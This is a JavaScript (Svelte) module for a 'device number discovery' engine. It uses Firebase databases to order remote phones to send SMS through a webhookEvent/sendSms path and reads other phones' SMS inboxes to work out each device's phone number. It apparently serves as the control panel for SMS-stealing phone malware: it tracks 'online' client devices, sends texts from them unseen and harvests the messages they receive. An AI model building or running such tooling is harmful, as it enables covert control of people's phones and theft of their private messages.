/**
 * Discovery Engine — persistent singleton with parallel workers.
 * Survives SvelteKit route navigation (module-level state).
 * Survives page refresh (localStorage persistence + auto-resume).
 *
 * Uses Svelte 5 runes ($state, $derived) in a .svelte.js module.
 */

import { apiFetch } from '$lib/firebase.js';
import { isOnline, fmtPhone, extractNumber } from '$lib/device-helpers.js';

// ── Constants ───────────────────────────────────────────────────────────────
const ENGINE_KEY = 'device-number-discovery:engine';
const LEGACY_KEY = 'device-number-discovery:v1';
const MAX_DAILY_ATTEMPTS = 6;
const MAX_LOG = 300;

const isBrowser = typeof window !== 'undefined';
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function today() { return new Date().toISOString().split('T')[0]; }
function nowIST() {
  try {
    return new Date().toLocaleString('en-IN', {
      hour: '2-digit', minute: '2-digit', second: '2-digit',
      hour12: false, timeZone: 'Asia/Kolkata'
    });
  } catch { return new Date().toLocaleTimeString(); }
}

// ── Default Connections ─────────────────────────────────────────────────────
const DEFAULT_CONNECTIONS = [];


// ═══════════════════════════════════════════════════════════════════════════
// REACTIVE STATE (module-level singleton — survives SPA navigation)
// ═══════════════════════════════════════════════════════════════════════════

export let engine = $state({
  initialized: false,
  status: 'IDLE', // IDLE | RUNNING | PAUSED | STOPPED | COMPLETED | NO_PROGRESS

  // Firebase
  connections: [...DEFAULT_CONNECTIONS],
  db: {},            // { connId: { loading, error, keys, info, ts } }
  localPhones: {},   // from main dashboard pd_phones
  devicesLoading: false,

  // Discovery
  records: [],               // successful discoveries
  failedTargets: [],         // deviceKeys that exhausted all receivers today
  triedReceivers: {},        // { targetKey: [receiverKey, ...] }
  lockedTargets: [],         // being processed right now
  lockedReceivers: [],       // in-use right now
  dailyAttempts: {},         // { deviceKey: { date, count } }
  tryTomorrow: [],           // deviceKeys deferred to next day
  skippedTargets: [],        // manually skipped deviceKeys
  receiverSuccessCount: {},  // { deviceKey: successCount } — for priority sorting

  // Workers
  workers: [],               // { id, status, targetKey, targetConn, receiverKey, receiverPhone, attempt, message }
  maxWorkers: 3,

  // Config
  config: {
    timeoutMs: 30000,
    pollIntervalMs: 3000,
    simSlot: 0,
    maxDailyAttempts: MAX_DAILY_ATTEMPTS,
  },

  // Log
  log: [],

  // Timing
  startedAt: null,
  elapsed: 0,  // seconds since start (updated every second)
});

// ═══════════════════════════════════════════════════════════════════════════
// DERIVED STATE (private — exported via getter functions below)
// ═══════════════════════════════════════════════════════════════════════════

let _allDevices = $derived.by(() => {
  const list = [];
  for (const conn of engine.connections) {
    if (!conn.enabled) continue;
    const entry = engine.db[conn.id];
    if (!entry?.keys || typeof entry.keys !== 'object') continue;
    for (const key of Object.keys(entry.keys)) {
      if (typeof key !== 'string' || key.length < 4) continue;
      const info = entry.info?.[key] ?? null;
      list.push({ connId: conn.id, conn, key, info });
    }
  }
  return list;
});

let _onlineDevices = $derived(_allDevices.filter(d => d.info && isOnline(d.info) === true));

let _withNumber = $derived(_onlineDevices.filter(d => {
  const phone = getDisplayPhone(d.connId, d.key, d.info);
  return phone && phone.length >= 5;
}));

let _discoveredIds = $derived(new Set(engine.records.filter(r => r.status === 'discovered').map(r => r.deviceId)));

let _withoutNumber = $derived(_onlineDevices.filter(d => {
  if (_discoveredIds.has(d.key)) return false; // already discovered \u2014 exclude from target list
  const phone = getDisplayPhone(d.connId, d.key, d.info);
  return !phone || phone.length < 5;
}));

let _discoveredCount = $derived(engine.records.filter(r => r.status === 'discovered').length);
let _failedCount = $derived(engine.failedTargets.length);
let _tomorrowCount = $derived(engine.tryTomorrow.length);
let _processingCount = $derived(engine.lockedTargets.length);

let _progressPct = $derived.by(() => {
  const total = _withoutNumber.length + _discoveredCount;
  return total === 0 ? 0 : Math.round((_discoveredCount / total) * 100);
});

// Exported getter functions (Svelte 5 requires this instead of exporting $derived)
export function allDevices() { return _allDevices; }
export function onlineDevices() { return _onlineDevices; }
export function withNumber() { return _withNumber; }
export function withoutNumber() { return _withoutNumber; }
export function discoveredCount() { return _discoveredCount; }
export function failedCount() { return _failedCount; }
export function tomorrowCount() { return _tomorrowCount; }
export function processingCount() { return _processingCount; }
export function progressPct() { return _progressPct; }

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

export function getDisplayPhone(connId, key, info) {
  return engine.localPhones[`${connId}::${key}`] ?? fmtPhone(info);
}

export function getDiscoveredPhone(deviceKey) {
  const rec = engine.records.find(r => r.deviceId === deviceKey && r.status === 'discovered');
  return rec?.phoneNumber ?? null;
}

function addLog(msg, type = 'info') {
  engine.log = [{ ts: nowIST(), msg, type, id: Date.now() + Math.random() }, ...engine.log].slice(0, MAX_LOG);
}

function isDeviceOnline(key) {
  for (const conn of engine.connections) {
    const info = engine.db[conn.id]?.info?.[key];
    if (info && isOnline(info) === true) return true;
  }
  return false;
}

function findDeviceInfo(key) {
  for (const conn of engine.connections) {
    const info = engine.db[conn.id]?.info?.[key];
    if (info) return { connId: conn.id, conn, info };
  }
  return null;
}

// ── Daily Attempt Tracking ──────────────────────────────────────────────────

function getDailyCount(deviceKey) {
  const entry = engine.dailyAttempts[deviceKey];
  if (!entry) return 0;
  if (entry.date !== today()) return 0; // reset on new day
  return entry.count;
}

function incrementDailyCount(deviceKey) {
  const d = today();
  const current = engine.dailyAttempts[deviceKey];
  if (!current || current.date !== d) {
    engine.dailyAttempts[deviceKey] = { date: d, count: 1 };
  } else {
    engine.dailyAttempts[deviceKey] = { date: d, count: current.count + 1 };
  }
}

function isOverDailyLimit(deviceKey) {
  return getDailyCount(deviceKey) >= engine.config.maxDailyAttempts;
}

function moveToTomorrow(deviceKey) {
  if (!engine.tryTomorrow.includes(deviceKey)) {
    engine.tryTomorrow = [...engine.tryTomorrow, deviceKey];
    addLog(`📅 ${deviceKey.slice(0, 10)}… → try tomorrow (${getDailyCount(deviceKey)}/${engine.config.maxDailyAttempts} attempts today)`, 'warn');
  }
}

// Reset "try tomorrow" for devices whose daily count has reset (new day)
function resetTomorrowIfNewDay() {
  const d = today();
  const freed = [];
  engine.tryTomorrow = engine.tryTomorrow.filter(key => {
    const entry = engine.dailyAttempts[key];
    if (!entry || entry.date !== d) {
      freed.push(key);
      return false; // remove from tomorrow list
    }
    return true; // still over limit today
  });
  if (freed.length > 0) {
    addLog(`🌅 ${freed.length} device(s) freed from try-tomorrow (new day)`, 'success');
  }
  // Also clear failed targets on new day to allow retry
  const failedFreed = engine.failedTargets.filter(key => {
    const entry = engine.dailyAttempts[key];
    return !entry || entry.date !== d;
  });
  if (failedFreed.length > 0) {
    engine.failedTargets = engine.failedTargets.filter(k => !failedFreed.includes(k));
    addLog(`🌅 ${failedFreed.length} failed device(s) reset for new day`, 'success');
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE FETCHING
// ═══════════════════════════════════════════════════════════════════════════

async function fetchConn(conn) {
  if (!conn.enabled) return;
  if (engine.db[conn.id]?.deactivated) return;
  engine.db[conn.id] = { ...engine.db[conn.id], loading: true, error: null };
  try {
    const { data: keysData } = await apiFetch(conn, conn.path, 'GET', undefined, { shallow: 'true' });
    const keys = keysData && typeof keysData === 'object' ? keysData : {};
    let info = {};
    if (conn.infoPath) {
      try {
        const { data: infoData } = await apiFetch(conn, conn.infoPath);
        if (infoData && typeof infoData === 'object') info = infoData;
      } catch {}
    }
    engine.db[conn.id] = { loading: false, error: null, deactivated: false, keys, info, ts: new Date().toISOString() };
  } catch (e) {
    const isDeact = String(e.message).includes('deactivated') || String(e.message).includes('423') || String(e.message).includes('Locked');
    engine.db[conn.id] = {
      ...engine.db[conn.id],
      loading: false,
      error: isDeact ? 'Database deactivated in Firebase' : e.message,
      deactivated: isDeact,
      ts: new Date().toISOString()
    };
  }
}

export async function fetchAllDevices() {
  engine.devicesLoading = true;
  await Promise.allSettled(engine.connections.filter(c => c.enabled).map(c => fetchConn(c)));
  engine.devicesLoading = false;
  persistState();
}

// ═══════════════════════════════════════════════════════════════════════════
// WORKER COORDINATION (synchronous — safe between awaits)
// ═══════════════════════════════════════════════════════════════════════════

function pickTarget() {
  const discoveredIds = new Set(engine.records.filter(r => r.status === 'discovered').map(r => r.deviceId));

  for (const dev of _withoutNumber) {
    if (discoveredIds.has(dev.key)) continue;
    if (engine.lockedTargets.includes(dev.key)) continue;
    if (engine.failedTargets.includes(dev.key)) continue;
    if (engine.tryTomorrow.includes(dev.key)) continue;
    if (engine.skippedTargets.includes(dev.key)) continue;
    if (isOverDailyLimit(dev.key)) { moveToTomorrow(dev.key); continue; }
    if (!isDeviceOnline(dev.key)) continue; // skip offline

    // Lock it
    engine.lockedTargets = [...engine.lockedTargets, dev.key];
    return dev;
  }
  return null;
}

function releaseTarget(key) {
  engine.lockedTargets = engine.lockedTargets.filter(k => k !== key);
}

function pickReceiver(targetKey) {
  const tried = engine.triedReceivers[targetKey] ?? [];

  // Build a combined receiver pool: original withNumber + discovered devices
  const candidateMap = new Map();

  // 1. Add all online devices with known numbers
  for (const dev of _withNumber) {
    if (dev.key === targetKey) continue;
    if (tried.includes(dev.key)) continue;
    if (engine.lockedReceivers.includes(dev.key)) continue;
    if (!isDeviceOnline(dev.key)) continue;
    const phone = getDisplayPhone(dev.connId, dev.key, dev.info);
    if (!phone || phone.length < 5) continue;
    candidateMap.set(dev.key, { ...dev, phone });
  }

  // 2. Add discovered devices (their numbers are now known)
  for (const rec of engine.records) {
    if (rec.status !== 'discovered' || !rec.phoneNumber) continue;
    if (rec.deviceId === targetKey) continue;
    if (tried.includes(rec.deviceId)) continue;
    if (engine.lockedReceivers.includes(rec.deviceId)) continue;
    if (candidateMap.has(rec.deviceId)) continue; // already in pool
    if (!isDeviceOnline(rec.deviceId)) continue;
    // Find device info
    const devInfo = findDeviceInfo(rec.deviceId);
    if (!devInfo) continue;
    candidateMap.set(rec.deviceId, {
      connId: devInfo.connId, conn: devInfo.conn, key: rec.deviceId,
      info: devInfo.info, phone: rec.phoneNumber,
    });
  }

  if (candidateMap.size === 0) return null;

  // 3. Sort by success count (most successful first = proven active)
  const candidates = [...candidateMap.values()];
  candidates.sort((a, b) => {
    const sa = engine.receiverSuccessCount[a.key] ?? 0;
    const sb = engine.receiverSuccessCount[b.key] ?? 0;
    return sb - sa; // higher success count first
  });

  // Pick the top candidate
  const best = candidates[0];
  engine.lockedReceivers = [...engine.lockedReceivers, best.key];
  return best;
}

function releaseReceiver(key) {
  engine.lockedReceivers = engine.lockedReceivers.filter(k => k !== key);
}

function markReceiverTried(targetKey, receiverKey) {
  const current = engine.triedReceivers[targetKey] ?? [];
  if (!current.includes(receiverKey)) {
    engine.triedReceivers = { ...engine.triedReceivers, [targetKey]: [...current, receiverKey] };
  }
}

function markFailed(targetKey) {
  if (!engine.failedTargets.includes(targetKey)) {
    engine.failedTargets = [...engine.failedTargets, targetKey];
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// SMS SENDING & POLLING
// ═══════════════════════════════════════════════════════════════════════════

async function sendSmsViaDevice(targetDevice, receiverPhone, messageBody) {
  const conn = engine.connections.find(c => c.id === targetDevice.connId);
  if (!conn) throw new Error(`Connection not found`);
  const to = receiverPhone.replace(/\D/g, '');
  if (!to) throw new Error('Invalid receiver phone');

  const url = `${conn.url.replace(/\/+$/, '')}/clients/${targetDevice.key}/webhookEvent/sendSms.json?auth=${encodeURIComponent(conn.url)}`;
  const res = await fetch(url, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ from: engine.config.simSlot + 1, to, message: messageBody, isSended: false }),
  });
  const json = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(json?.error ?? `HTTP ${res.status}`);
}

async function pollForMatch(receiverDevice, targetDeviceId, startTime) {
  const conn = engine.connections.find(c => c.id === receiverDevice.connId);
  if (!conn) return null;

  try {
    const { data } = await apiFetch(conn, `${conn.path}/${receiverDevice.key}`, 'GET', undefined, { orderBy: '"$key"', limitToLast: '15' });
    if (!data || typeof data !== 'object') return null;

    for (const [msgId, msg] of Object.entries(data)) {
      if (typeof msg !== 'object' || !msg) continue;
      const msgText = msg.message ?? msg.body ?? msg.text ?? '';
      if ((msg.type ?? 'incoming') !== 'incoming') continue;
      if (!msgText.includes(targetDeviceId)) continue;

      const msgTime = msg.dateTime ? new Date(msg.dateTime).getTime() : 0;
      const msgKeyTime = parseInt(msgId);
      if (msgTime > 0 && msgTime < startTime - 60000) continue;
      if (msgKeyTime > 0 && msgKeyTime < startTime - 60000) continue;

      const sender = msg.sender ?? msg.from ?? '';
      if (!sender) continue;

      return { msgId, sender: String(sender), message: msgText, dateTime: msg.dateTime };
    }
  } catch (e) {
    addLog(`⚠ Poll error: ${e.message}`, 'error');
  }
  return null;
}

async function pollWithTimeout(receiver, targetKey, startTime) {
  const deadline = startTime + engine.config.timeoutMs;
  while (Date.now() < deadline) {
    if (engine.status !== 'RUNNING') return null;
    const match = await pollForMatch(receiver, targetKey, startTime);
    if (match) return match;
    await sleep(engine.config.pollIntervalMs);
  }
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════
// WORKER LOOP (each worker is an independent async function)
// ═══════════════════════════════════════════════════════════════════════════

function updateWorker(id, patch) {
  engine.workers = engine.workers.map(w => w.id === id ? { ...w, ...patch } : w);
}

async function workerLoop(workerId) {
  updateWorker(workerId, { status: 'starting' });

  while (engine.status === 'RUNNING') {
    // 1. Pick target
    const target = pickTarget();
    if (!target) {
      updateWorker(workerId, { status: 'idle', targetKey: null, receiverKey: null, receiverPhone: null, message: 'No targets available' });
      await sleep(2000); // wait a bit and check again (new devices may come online)

      // Re-check: if still nothing, exit
      const target2 = pickTarget();
      if (!target2) break;
      // Got one on retry — release and re-pick normally in next loop iteration
      releaseTarget(target2.key);
      continue;
    }

    // Check if over daily limit
    if (isOverDailyLimit(target.key)) {
      moveToTomorrow(target.key);
      releaseTarget(target.key);
      continue;
    }

    // Check online
    if (!isDeviceOnline(target.key)) {
      addLog(`⏭ W${workerId}: ${target.key.slice(0, 10)}… offline, skipping`, 'warn');
      releaseTarget(target.key);
      continue;
    }

    updateWorker(workerId, { status: 'selecting', targetKey: target.key, targetConn: target.conn.name, receiverKey: null, receiverPhone: null, message: `Selecting receiver…` });

    // 2. Try receivers for this target
    let discovered = false;
    let receiverAttempts = 0;

    while (engine.status === 'RUNNING' && !discovered) {
      // Check daily limit before each send attempt
      if (isOverDailyLimit(target.key)) {
        moveToTomorrow(target.key);
        break;
      }

      // Check target still online
      if (!isDeviceOnline(target.key)) {
        addLog(`⏭ W${workerId}: ${target.key.slice(0, 10)}… went offline`, 'warn');
        break;
      }

      const receiver = pickReceiver(target.key);
      if (!receiver) break; // no more receivers

      // Check receiver online
      if (!isDeviceOnline(receiver.key)) {
        releaseReceiver(receiver.key);
        markReceiverTried(target.key, receiver.key);
        continue;
      }

      receiverAttempts++;
      incrementDailyCount(target.key);
      const attemptStart = Date.now();

      updateWorker(workerId, {
        status: 'sending',
        receiverKey: receiver.key,
        receiverPhone: extractNumber(receiver.phone),
        attempt: receiverAttempts,
        message: `Sending SMS…`
      });

      addLog(`📤 W${workerId}: ${target.key.slice(0, 10)}… → ${receiver.key.slice(0, 10)}… (${extractNumber(receiver.phone)})`, 'info');

      // 3. Send SMS
      try {
        await sendSmsViaDevice(target, receiver.phone, target.key);
      } catch (e) {
        addLog(`✗ W${workerId}: Send failed: ${e.message}`, 'error');
        releaseReceiver(receiver.key);
        markReceiverTried(target.key, receiver.key);
        continue;
      }

      updateWorker(workerId, { status: 'waiting', message: `Waiting for response…` });

      // 4. Poll for match
      const match = await pollWithTimeout(receiver, target.key, attemptStart);
      releaseReceiver(receiver.key);
      markReceiverTried(target.key, receiver.key);

      if (match) {
        discovered = true;
        handleMatch(target, receiver, match, workerId, receiverAttempts);
      } else {
        addLog(`⏱ W${workerId}: Timeout ${target.key.slice(0, 10)}… via ${receiver.key.slice(0, 10)}…`, 'warn');
      }
    }

    if (!discovered) {
      if (isOverDailyLimit(target.key)) {
        // Already moved to tomorrow
      } else if (!isDeviceOnline(target.key)) {
        addLog(`⏭ W${workerId}: ${target.key.slice(0, 10)}… offline — will retry when back online`, 'warn');
      } else {
        markFailed(target.key);
        addLog(`✗ W${workerId}: ${target.key.slice(0, 10)}… exhausted all receivers`, 'error');
      }
    }

    releaseTarget(target.key);
    persistState();
  }

  updateWorker(workerId, { status: 'stopped', targetKey: null, receiverKey: null, receiverPhone: null, message: 'Worker stopped' });
  checkAllWorkersDone();
}

function handleMatch(target, receiver, match, workerId, attempts) {
  const senderPhone = match.sender;
  addLog(`🎯 W${workerId}: MATCH! ${target.key.slice(0, 10)}… → ${senderPhone}`, 'success');

  // Check for duplicates
  const existing = engine.records.find(r => r.deviceId === target.key && r.status === 'discovered');
  if (existing) {
    addLog(`⚠ ${target.key.slice(0, 10)}… already discovered (${existing.phoneNumber})`, 'warn');
    return;
  }

  engine.records = [...engine.records, {
    deviceId: target.key,
    phoneNumber: senderPhone,
    status: 'discovered',
    discoveryMethod: 'sms',
    messageBody: match.message,
    senderDeviceId: target.key,
    receiverDeviceId: receiver.key,
    receiverPhoneNumber: receiver.phone,
    attemptCount: attempts,
    discoveredAt: new Date().toISOString(),
    connectionId: target.connId,
    connectionName: target.conn.name,
  }];

  // Track receiver success for priority sorting
  engine.receiverSuccessCount = {
    ...engine.receiverSuccessCount,
    [receiver.key]: (engine.receiverSuccessCount[receiver.key] ?? 0) + 1,
  };

  persistState();
}

function checkAllWorkersDone() {
  const activeWorkers = engine.workers.filter(w => w.status !== 'stopped' && w.status !== 'idle');
  if (activeWorkers.length === 0 && engine.status === 'RUNNING') {
    // All workers finished — determine final state
    const discoveredIds = new Set(engine.records.filter(r => r.status === 'discovered').map(r => r.deviceId));
    const remaining = _withoutNumber.filter(d =>
      !discoveredIds.has(d.key) &&
      !engine.failedTargets.includes(d.key) &&
      !engine.tryTomorrow.includes(d.key)
    );

    if (remaining.length === 0 && _withoutNumber.length === 0) {
      engine.status = 'COMPLETED';
      addLog('🎉 All eligible devices identified!', 'success');
    } else if (remaining.length === 0) {
      const msg = [];
      if (engine.failedTargets.length) msg.push(`${engine.failedTargets.length} failed`);
      if (engine.tryTomorrow.length) msg.push(`${engine.tryTomorrow.length} deferred to tomorrow`);
      engine.status = 'COMPLETED';
      addLog(`✅ Cycle complete. ${_discoveredCount} discovered. ${msg.join(', ')}.`, 'success');
    } else {
      engine.status = 'NO_PROGRESS';
      addLog(`⏸ No progress: ${remaining.length} remain unidentified`, 'warn');
    }
    stopTimers();
    persistState();
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// TIMERS (device refresh + elapsed counter)
// ═══════════════════════════════════════════════════════════════════════════

let _refreshTimer = null;
let _elapsedTimer = null;

function startTimers() {
  stopTimers();
  // Refresh devices every 15s while running
  _refreshTimer = setInterval(() => {
    if (engine.status === 'RUNNING') fetchAllDevices();
  }, 15000);
  // Elapsed seconds counter
  _elapsedTimer = setInterval(() => {
    if (engine.status === 'RUNNING' && engine.startedAt) {
      engine.elapsed = Math.floor((Date.now() - new Date(engine.startedAt).getTime()) / 1000);
    }
  }, 1000);
}

function stopTimers() {
  if (_refreshTimer) { clearInterval(_refreshTimer); _refreshTimer = null; }
  if (_elapsedTimer) { clearInterval(_elapsedTimer); _elapsedTimer = null; }
}

// ═══════════════════════════════════════════════════════════════════════════
// PERSISTENCE
// ═══════════════════════════════════════════════════════════════════════════

function persistState() {
  if (!isBrowser) return;
  try {
    localStorage.setItem(ENGINE_KEY, JSON.stringify({
      status: engine.status,
      records: engine.records,
      failedTargets: engine.failedTargets,
      triedReceivers: engine.triedReceivers,
      dailyAttempts: engine.dailyAttempts,
      tryTomorrow: engine.tryTomorrow,
      skippedTargets: engine.skippedTargets,
      receiverSuccessCount: engine.receiverSuccessCount,
      config: engine.config,
      maxWorkers: engine.maxWorkers,
      startedAt: engine.startedAt,
      log: engine.log.slice(0, 50),
    }));
  } catch {}
}

function restoreState() {
  if (!isBrowser) return false;
  try {
    // Migrate legacy records
    const legacy = localStorage.getItem(LEGACY_KEY);
    if (legacy) {
      try {
        const parsed = JSON.parse(legacy);
        if (parsed?.records?.length) {
          engine.records = parsed.records;
        }
        localStorage.removeItem(LEGACY_KEY);
      } catch {}
    }

    const raw = localStorage.getItem(ENGINE_KEY);
    if (!raw) return false;
    const data = JSON.parse(raw);

    engine.records = data.records ?? [];
    engine.failedTargets = data.failedTargets ?? [];
    engine.triedReceivers = data.triedReceivers ?? {};
    engine.dailyAttempts = data.dailyAttempts ?? {};
    engine.tryTomorrow = data.tryTomorrow ?? [];
    engine.skippedTargets = data.skippedTargets ?? [];
    engine.receiverSuccessCount = data.receiverSuccessCount ?? {};
    engine.config = { ...engine.config, ...(data.config ?? {}) };
    engine.maxWorkers = data.maxWorkers ?? 3;
    engine.startedAt = data.startedAt ?? null;
    engine.log = data.log ?? [];

    return data.status === 'RUNNING';
  } catch { return false; }
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC API
// ═══════════════════════════════════════════════════════════════════════════

export function initEngine() {
  if (!isBrowser || engine.initialized) return;
  engine.initialized = true;

  // Load connections from main dashboard
  try {
    const saved = JSON.parse(localStorage.getItem('pd_connections') || 'null');
    if (Array.isArray(saved) && saved.length) {
      engine.connections = saved.filter(c => !c.url?.includes('newpanel-4412c'));
    }
  } catch {}

  // Load local phones
  try { engine.localPhones = JSON.parse(localStorage.getItem('pd_phones') || '{}'); } catch {}

  // Restore state
  const wasRunning = restoreState();

  // Reset tomorrow list if new day
  resetTomorrowIfNewDay();

  // Persist on unload
  window.addEventListener('beforeunload', persistState);

  // Initial device load
  fetchAllDevices();

  // Auto-resume if was running
  if (wasRunning) {
    addLog('🔄 Auto-resuming discovery after page reload…', 'info');
    startDiscoveryInternal();
  }
}

function spawnWorkers() {
  const count = engine.maxWorkers;
  engine.workers = [];
  for (let i = 0; i < count; i++) {
    engine.workers.push({
      id: i, status: 'idle', targetKey: null, targetConn: null,
      receiverKey: null, receiverPhone: null, attempt: 0, message: 'Idle'
    });
  }
  // Launch each worker as a fire-and-forget async loop
  for (let i = 0; i < count; i++) {
    workerLoop(i);
  }
}

async function startDiscoveryInternal() {
  engine.status = 'RUNNING';
  if (!engine.startedAt) engine.startedAt = new Date().toISOString();
  startTimers();
  spawnWorkers();
  persistState();
}

export async function startDiscovery() {
  if (engine.status === 'RUNNING') return; // already running

  if (engine.status === 'PAUSED') {
    addLog('▶ Discovery resumed', 'info');
    engine.status = 'RUNNING';
    startTimers();
    spawnWorkers();
    persistState();
    return;
  }

  addLog('🚀 Discovery started', 'info');
  engine.devicesLoading = true;
  await fetchAllDevices();
  engine.devicesLoading = false;

  resetTomorrowIfNewDay();

  if (_withoutNumber.length === 0) {
    engine.status = 'COMPLETED';
    addLog('✅ All online devices already have phone numbers!', 'success');
    return;
  }
  if (_withNumber.length === 0) {
    engine.status = 'NO_PROGRESS';
    addLog('⚠ No online devices with known phone numbers to use as receivers', 'warn');
    return;
  }

  addLog(`📊 ${_onlineDevices.length} online, ${_withNumber.length} with numbers, ${_withoutNumber.length} missing. ${engine.maxWorkers} workers.`, 'info');

  engine.startedAt = new Date().toISOString();
  await startDiscoveryInternal();
}

export function pauseDiscovery() {
  engine.status = 'PAUSED';
  // Workers will stop at next check point
  // Release all locks so workers can exit cleanly
  engine.lockedTargets = [];
  engine.lockedReceivers = [];
  stopTimers();
  addLog('⏸ Discovery paused — workers stopping…', 'warn');
  persistState();
}

export function stopDiscovery() {
  engine.status = 'STOPPED';
  engine.lockedTargets = [];
  engine.lockedReceivers = [];
  engine.workers = [];
  engine.startedAt = null;
  engine.elapsed = 0;
  stopTimers();
  addLog('⏹ Discovery stopped', 'info');
  persistState();
}

export function retryFailed() {
  const count = engine.failedTargets.length;
  engine.failedTargets = [];
  engine.triedReceivers = {};
  addLog(`🔄 Reset ${count} failed devices for retry`, 'info');
  if (['NO_PROGRESS', 'COMPLETED', 'STOPPED'].includes(engine.status)) {
    engine.status = 'IDLE';
  }
  persistState();
}

export function retryTomorrow() {
  const count = engine.tryTomorrow.length;
  // Reset daily counts for these devices
  for (const key of engine.tryTomorrow) {
    delete engine.dailyAttempts[key];
  }
  engine.tryTomorrow = [];
  // Also reset their tried receivers
  for (const key of Object.keys(engine.triedReceivers)) {
    if (engine.tryTomorrow.includes(key)) {
      delete engine.triedReceivers[key];
    }
  }
  addLog(`🔄 Reset ${count} try-tomorrow devices (daily counts cleared)`, 'info');
  persistState();
}

export async function refreshDevices() {
  await fetchAllDevices();
}

export function setMaxWorkers(n) {
  engine.maxWorkers = Math.max(1, Math.min(10, n));
  persistState();
}

export function clearLog() {
  engine.log = [];
}

export function clearRecords() {
  engine.records = [];
  engine.failedTargets = [];
  engine.triedReceivers = {};
  engine.dailyAttempts = {};
  engine.tryTomorrow = [];
  engine.skippedTargets = [];
  persistState();
  addLog('🗑 All discovery records cleared', 'warn');
}

export function downloadJson() {
  if (!isBrowser) return;
  const data = {
    version: 2,
    exportTimestamp: new Date().toISOString(),
    records: engine.records,
    tryTomorrow: engine.tryTomorrow,
    dailyAttempts: engine.dailyAttempts,
    summary: {
      totalDiscovered: engine.records.filter(r => r.status === 'discovered').length,
      totalFailed: engine.failedTargets.length,
      totalTryTomorrow: engine.tryTomorrow.length,
    },
  };
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `device-number-discovery-${today()}.json`;
  a.click();
  URL.revokeObjectURL(url);
  addLog(`📥 Exported ${engine.records.length} records`, 'info');
}

export function formatElapsed(secs) {
  const h = Math.floor(secs / 3600);
  const m = Math.floor((secs % 3600) / 60);
  const s = secs % 60;
  if (h > 0) return `${h}h ${m}m ${s}s`;
  if (m > 0) return `${m}m ${s}s`;
  return `${s}s`;
}

// ═══════════════════════════════════════════════════════════════════════════
// MANUAL ACTIONS
// ═══════════════════════════════════════════════════════════════════════════

export function skipTarget(deviceKey) {
  if (!engine.skippedTargets.includes(deviceKey)) {
    engine.skippedTargets = [...engine.skippedTargets, deviceKey];
    addLog(`⏭ Manually skipped: ${deviceKey.slice(0, 14)}…`, 'warn');
    persistState();
  }
}

export function unskipTarget(deviceKey) {
  engine.skippedTargets = engine.skippedTargets.filter(k => k !== deviceKey);
  addLog(`↩ Un-skipped: ${deviceKey.slice(0, 14)}…`, 'info');
  persistState();
}

export function unskipAll() {
  const count = engine.skippedTargets.length;
  engine.skippedTargets = [];
  addLog(`↩ Un-skipped all ${count} devices`, 'info');
  persistState();
}

export function manualAssignNumber(deviceKey, phoneNumber, connId, connName) {
  const phone = phoneNumber.trim();
  if (!phone || phone.length < 5) throw new Error('Phone number too short');
  if (!deviceKey) throw new Error('No device selected');

  // Check existing
  const existing = engine.records.find(r => r.deviceId === deviceKey && r.status === 'discovered');
  if (existing) {
    addLog(`⚠ ${deviceKey.slice(0, 14)}… already has number ${existing.phoneNumber} — overwriting`, 'warn');
    engine.records = engine.records.filter(r => !(r.deviceId === deviceKey && r.status === 'discovered'));
  }

  engine.records = [...engine.records, {
    deviceId: deviceKey,
    phoneNumber: phone,
    status: 'discovered',
    discoveryMethod: 'manual',
    messageBody: '',
    senderDeviceId: deviceKey,
    receiverDeviceId: 'manual-entry',
    receiverPhoneNumber: '',
    attemptCount: 0,
    discoveredAt: new Date().toISOString(),
    connectionId: connId ?? '',
    connectionName: connName ?? '',
  }];

  // Remove from skipped/failed/tomorrow if present
  engine.skippedTargets = engine.skippedTargets.filter(k => k !== deviceKey);
  engine.failedTargets = engine.failedTargets.filter(k => k !== deviceKey);
  engine.tryTomorrow = engine.tryTomorrow.filter(k => k !== deviceKey);

  addLog(`✏️ Manually assigned ${phone} → ${deviceKey.slice(0, 14)}…`, 'success');
  persistState();
}

export async function sendManualSms(fromDeviceKey, fromConnId, toPhone, message) {
  const conn = engine.connections.find(c => c.id === fromConnId);
  if (!conn) throw new Error('Connection not found');
  const to = toPhone.replace(/\D/g, '');
  if (!to || to.length < 5) throw new Error('Invalid phone number');
  if (!message.trim()) throw new Error('Message is empty');

  const url = `${conn.url.replace(/\/+$/, '')}/clients/${fromDeviceKey}/webhookEvent/sendSms.json?auth=${encodeURIComponent(conn.url)}`;
  const res = await fetch(url, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ from: engine.config.simSlot + 1, to, message: message.trim(), isSended: false }),
  });
  const json = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(json?.error ?? `HTTP ${res.status}`);
  addLog(`📤 Manual SMS: ${fromDeviceKey.slice(0, 10)}… → ${to} "${message.trim().slice(0, 30)}"`, 'success');
  return json;
}

export function skippedCount() { return engine.skippedTargets.length; }
